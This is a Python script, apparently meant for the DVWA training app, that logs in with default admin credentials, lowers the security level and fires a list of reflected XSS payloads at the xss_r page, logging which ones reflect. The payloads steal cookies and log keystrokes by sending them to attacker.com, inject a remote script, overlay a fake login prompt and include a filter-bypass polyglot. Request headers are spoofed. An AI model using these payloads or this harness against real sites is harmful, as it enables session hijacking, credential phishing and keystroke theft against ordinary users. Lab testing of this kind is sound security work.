from bs4 import BeautifulSoup
import requests
from datetime import datetime
from pathlib import Path
import sys
import json
import urllib.parse
import time
import os

# Configuração inicial
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL or request rate was not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 15, 'medium': 2, 'high': 0.5}
delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized

xss_url = f"{base_url}/vulnerabilities/xss_r/"

# Headers to spoof User-Agent and IP address
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'X-Forwarded-For': '192.168.1.1'
}

# Construct the target URL for brute force attacks
target_url = f"{base_url}/vulnerabilities/brute/"
login_url = f"{base_url}/login.php"
security_url = f"{base_url}/security.php"

def login_and_setup_security():
    #response = session.get(login_url)
    data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
    }
    response = session.post(login_url, data=data, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
    time.sleep(delay) 
    
    #response = session.get(security_url)
    data = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': user_token
    }
    session.post(security_url, data=data, headers=headers)
    time.sleep(delay) 
    
def reflected_xss_attack():
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    details = []

    # Payloads de JavaScript para testar
    payloads = [
        "<script>alert('XSS');</script>",
        "<script>fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));</script>",
        "<script>var i=document.createElement('img'); i.src='http://attacker.com/steal?cookie='+document.cookie; document.body.appendChild(i);</script>",
        """jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</tiTle/</teXtarEa/</scRipt/--><p" onclick=alert()//>*/<style>/*</style>/*</title>/*</textarea>/*</script>-->""",
        "<script>if(document.location.href.indexOf('http://legitimate.com')!=-1){document.write('<script src=\"http://attacker.com/malicious.js\"><\/script>');}</script>",
        "<script>document.body.innerHTML = '<h1>Your session has expired. Please <a href=\"http://fake-login.com\">login again</a>.</h1>';</script>",
        "<script>document.onkeypress = function(e) { fetch('http://attacker.com/log?key=' + e.key); }</script>",
        "<object data=data:text/html;base64, PHNjcmlwdD5hbGVydCgnWFNTLUNsb3VkZmxhcmUtQnlwYXNzLUJ5LUVMSVpFVU9QQUlOJyk8L3NjcmlwdD4=>",
    ]

    for payload in payloads:
        encoded_payload = urllib.parse.quote_plus(payload)
        full_url = f"{xss_url}?name={encoded_payload}"
        response = session.get(full_url)
        total_tests += 1

        # Verifica se o payload foi refletido no conteúdo da página e o status é 200
        if 200 <= response.status_code < 300 and payload.strip('<script></script>') in response.text:
            tests_passed += 1
            result = "PASSED"
            print(f"Payload successful: {payload}")
        else:
            tests_failed += 1
            result = "FAILED"
            print(f"Payload failed: {payload}")

        details.append({
            "payload": payload,
            "status_code": response.status_code,
            "result": result
        })

        time.sleep(delay)

    # Log dos resultados
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': xss_url,
        'details': details
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    login_and_setup_security()
    reflected_xss_attack()